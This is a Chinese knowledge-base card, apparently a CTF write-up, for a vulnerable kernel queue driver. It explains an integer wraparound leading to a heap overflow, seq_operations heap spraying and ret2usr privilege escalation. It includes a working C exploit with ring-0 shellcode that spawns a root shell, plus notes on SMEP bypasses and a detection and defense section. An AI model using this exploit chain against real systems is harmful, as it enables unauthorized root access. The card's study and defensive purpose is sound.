---
id: binary-pwn-kernel-kqueue-maxentries-intwrap-seqops-ret2usr
title: 内核队列驱动 max_entries=-1 整数回绕：0x20 堆溢出 + seq_operations 堆喷 + ret2usr 提权
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-kqueue-maxentries-intwrap-seqops-ret2usr
tags:
- kernel
- pwn
- heap-overflow
- integer-overflow
- seq-operations
- heap-spray
- ret2usr
- commit-creds
- ioctl
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T11:38:43+08:00'
  notes: 已对照原文与3张图核对：request_t/queue/queue_entry 布局、max_entries=0xffffffff 时 +1 回绕得 queue_size=0x20、save 用 queue->queue_size 做 kzalloc 却按 data_size=0x40 memcpy 造成 0x20 溢出、seq_operations 堆喷 open(/proc/self/stat)、read 触发 start、shellcode 由 [rsp+8]-0x201179 推基址并 call +0x8c580/+0x8c140、swapgs+iretq 均与原文/图3一致；图3 显示成功 root。未验证点：未在本机复跑 QEMU PoC；CTF 题无版本区间；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-kqueue-maxentries-intwrap-seqops-ret2usr/
draft: false
kb_aliases:
- 强网杯2021 notebook
- kqueue 堆溢出
- max_entries 整数溢出
- seq_operations 堆喷
- ret2usr 内核提权
---

## 一句话结论

队列驱动把用户传入的 32 位 `max_entries` 加一后用于计算 `kmalloc` 大小，传入 `0xffffffff` 使 `+1` 回绕成 0，只分配到 `0x20` 字节的 queue 头，但对象里仍保存 `max_entries=0xffffffff`；后续 `save` 用不匹配的 `queue_size` 做 `kzalloc`、却按用户给的 `data_size` 执行 `memcpy`，形成固定长度的线性堆溢出。喷大量 `seq_operations` 后，用溢出把 `start` 指针改成用户态 shellcode 地址，`read()` 触发 `seq_ops->start()`，shellcode 在未开 SMEP 的内核里执行 `commit_creds(prepare_kernel_cred(0))` 并 `swapgs; iretq` 返回用户态拿 root。

## 原理

- **结构体布局**（结合源码在 IDA 中恢复）：
  - `request_t { u32 max_entries; u16 data_size; u16 entry_idx; u16 queue_idx; char *data; }`；
  - `queue { u16 data_size; u64 queue_size; u32 max_entries; u16 idx; char *data; }`；
  - `queue_entry { u16 idx; char *data; queue_entry *next; }`。
  - 第一次 `kmalloc` 把 `queue` 头和 `queue_entry[max_entries]` 放在同一块连续内存，`queue->data` 与每个 `entry->data` 再分别 `kmalloc(data_size)`。
- **整数回绕点**：`create` 中 `max_entries = request.max_entries + 1`、`queue_size = 24 * (request.max_entries + 1) + 0x20`。当 `request.max_entries = 0xffffffff` 时，32 位加法回绕为 0，`queue_size = 0x20`，`kmalloc(0x20)` 只够放 queue 头，entry 数量为 0；但 `queue->max_entries` 仍被写成 `0xffffffff`，后续边界检查因此全部失效。
- **尺寸不一致导致溢出**：`save` 先 `kzalloc(queue->queue_size)` 得到 `0x20` 字节的新缓冲区，随后按 `request.data_size`（示例 `0x40`）从 `queue->data` 拷贝。源码中的 `data_size > queue_size` 检查只调用 `err()` 打印错误而不终止，于是 `0x40` 字节写入 `0x20` 字节对象，多出的 `0x20` 字节覆盖物理相邻对象。
- **为什么用 `seq_operations`**：`seq_operations` 是 `kmalloc-32` 的常用喷射对象，前两个字段就是 `start`/`stop` 函数指针；打开 `/proc/self/stat` 等 seq 文件会分配它。大量打开后，`kmalloc-32` 的空闲槽被填满，`kzalloc(0x20)` 的相邻块大概率是一个 `seq_operations`，溢出即可改写其 `start`。
- **触发路径**：对任一被改写的 seq 文件 `read()`，`seq_read` 会调用 `m->op->start(m, &pos)`，控制流进入伪造的 `start`。
- **ret2usr**：题目 QEMU 启动参数未启用 SMEP/SMAP（`-cpu kvm64`，无 `+smep,+smap`），内核可以执行用户页代码。用户态 shellcode 从内核栈上的返回地址反推内核基址（`[rsp+8] - 固定偏移`），加固定偏移调用 `prepare_kernel_cred(0)`、`commit_creds(rax)`，再 `swapgs; iretq` 用事先保存的 `cs/ss/rflags/rsp/rip` 回到用户态。
- **为何 KASLR 不阻碍**：KASLR 只随机化基址，shellcode 通过当前栈上的内核返回地址动态计算基址，不需要提前泄露；固定偏移仍来自目标内核镜像。
- **为何是概率性成功**：堆喷能否让 `kzalloc(0x20)` 的物理相邻块正好是 `seq_operations` 取决于 SLUB 布局；通常多轮重试/增大喷射数量提高命中率。

## 触发条件

- 内核模块暴露 ioctl 设备，create/save 等操作使用用户可控的 32 位 `max_entries`/`data_size` 计算分配大小或拷贝长度。
- 存在“检查后使用”不一致：边界检查失败只打印/返回错误但不终止，或分配大小与拷贝长度来自不同字段。
- 目标内核未启用 SMEP/SMAP（ret2usr 可执行用户页），或攻击者能改用内核 ROP 绕过 SMEP。
- 堆中存在可喷射且含函数指针的对象（`seq_operations`、`tty_struct`、`msg_msg` 等），且其分配大小与溢出块匹配。

## 利用步骤

1. **恢复结构体**：有源码时用 IDAPython 把 `request_t`、`queue`、`queue_entry` 导入 Local Types（`idc.set_local_type`），再对 `create/edit/save/delete` 应用正确原型；重点关注字段偏移与 `u16/u32` 截断。没有源码时按分配大小（`24*N+0x20`）和访问偏移反推结构体。
2. **定位整数回绕**：审计 `max_entries + 1`、`24 * (max_entries + 1) + 0x20` 等表达式，确认 `0xffffffff` 使其回绕为 0，同时对象内仍保存原始大值。
3. **构造可控数据**：`create(0xffffffff, 0x100)` 使 queue 头只有 `0x20`、`queue->data` 为 `0x100`；`edit(0, 0, buf)` 把 `buf` 填成 32 个指向用户态 shellcode 的指针。
4. **堆喷**：循环 `open("/proc/self/stat", O_RDONLY)` 数百次，分配大量 `seq_operations`，占满 `kmalloc-32`。
5. **制造溢出**：调用 `save(0, 0, 0x40)`，让 `kzalloc(0x20)` 后的 `memcpy` 写入 `0x40` 字节；多出的 `0x20` 字节覆盖相邻 `seq_operations` 的 `start`（及后续函数指针）为 shellcode 地址。
6. **触发**：对所有 seq fd 执行 `read(fd, buf, 1)`；某一次命中被改写的对象即跳入 shellcode。
7. **提权与返回**：shellcode 计算内核基址、调用 `prepare_kernel_cred(0)`/`commit_creds()`，保存并恢复用户态寄存器，`swapgs; iretq` 返回 `getRootShell()`，检查 `getuid()==0` 后执行 `system("/bin/sh")`。
8. **稳定性**：若未命中，调整喷射数量、分配顺序或重试；在 GDB 中确认 `kzalloc(0x20)` 相邻块内容与 `seq_operations` 的 `start` 偏移。

## PoC

```c
// 关键交互与布局（偏移需按目标内核重新计算）
typedef struct { u32 max_entries; u16 data_size, entry_idx, queue_idx; char *data; } request_t;
static u64 fds[0x200], dev_fd;
static u64 payload[0x20];

static void create(u32 n, u16 sz) {
    request_t r = { .max_entries = n, .data_size = sz };
    ioctl(dev_fd, 0xDEADC0DE, &r);
}
static void edit(u16 q, u16 e, void *p) {
    request_t r = { .queue_idx = q, .entry_idx = e, .data = p };
    ioctl(dev_fd, 0xDAADEEEE, &r);
}
static void save(u16 q, u32 n, u16 sz) {
    request_t r = { .queue_idx = q, .max_entries = n, .data_size = sz };
    ioctl(dev_fd, 0xB105BABE, &r);
}

void shellcode(void) {                       // 在 ring0 执行（SMEP 关闭）
    __asm__(
        "mov r12, [rsp + 0x8];"              // 内核栈上的返回地址
        "sub r12, 0x201179;"                 // 反推内核基址
        "mov r13, r12;"
        "add r12, 0x8c580;"                  // prepare_kernel_cred
        "add r13, 0x8c140;"                  // commit_creds
        "xor rdi, rdi;"
        "call r12;"
        "mov rdi, rax;"
        "call r13;"
        "swapgs;"
        "push user_ss; push user_sp; push user_rflags; push user_cs; push rip;"
        "iretq;"
    );
}

int main(void) {
    save_user_state();                       // 保存 cs/ss/rsp/rflags，rip = getRootShell
    dev_fd = open("/dev/kqueue", O_RDONLY);
    for (int i = 0; i < 0x20; i++) payload[i] = (u64)shellcode;

    create(0xffffffff, 0x100);               // +1 回绕 -> queue 仅 0x20 字节
    edit(0, 0, payload);                     // queue->data 填满 shellcode 指针
    for (int i = 0; i < 0x200; i++) fds[i] = open("/proc/self/stat", O_RDONLY);
    save(0, 0, 0x40);                        // 0x20 字节线性堆溢出，覆盖 seq_operations->start
    for (int i = 0; i < 0x200; i++) read(fds[i], payload, 1);  // 触发 start()
    return 0;
}
```

说明：不同内核版本的 `prepare_kernel_cred`/`commit_creds` 偏移、返回地址到基址的差值都不同，必须从目标 `vmlinux` 重新计算；示例偏移仅对应该题内核。`save_user_state()` 与 `getRootShell()` 省略，作用是保存/恢复用户态段寄存器并在 `iretq` 后校验 `getuid()==0`。

## 变体与关联

- **同类整数问题**：`u16`/`u32` 加法回绕、`size = n * elem_size` 乘法溢出、`data_size` 与 `queue_size` 混用；审计时把所有尺寸表达式列出来，逐一检查回绕后的值。
- **喷射对象替换**：`seq_operations`（`kmalloc-32`）最经典；`tty_struct`/`tty_operations`、`msg_msg`、`pipe_buffer`、`sk_buff` 等可按块大小与可控字段替换。
- **绕过 SMEP/SMAP**：若目标开启 SMEP，可改为覆盖函数指针到内核 ROP 链（`commit_creds(prepare_kernel_cred(0))` + KPTI trampoline），或使用 `modprobe_path`/`core_pattern` 等数据面提权。
- **关联本库卡片**：`binary-pwn-kernel-qemu-initramfs-gdb-workflow` 提供环境与符号调试；`binary-pwn-kernel-module-ioctl-user-function-pointer-call` 是本场景的简化版（直接调用用户函数指针）；`binary-pwn-kernel-kmem-cache-uaf-encoded-callback-hijack` 展示另一种函数指针劫持路径。

## 检测与防御

- **检测**：驱动中 `max_entries + 1`、`elem_count * size` 等尺寸计算未做上界/回绕检查；分配大小与拷贝长度来自不同字段；`err()` 只打印不终止导致检查失效；`kmalloc-32` 附近出现异常函数指针（`seq_operations->start` 指向用户页）。
- **防御（内核驱动）**：对所有用户传入的计数/长度做 `check_mul_overflow`/`check_add_overflow`；分配与拷贝使用同一个已验证的尺寸变量；校验失败必须返回错误并终止操作；启用 SMEP/SMAP/KPTI/KASLR 并限制 `/proc` 文件描述符数量。
- **CTF 识别**：看到 `24 * (n + 1) + 0x20` 这类“结构体头 + 数组”布局、以及 create/edit/save/delete 四命令的设备，优先检查 `n = 0xffffffff` 的回绕与 save 的尺寸校验。
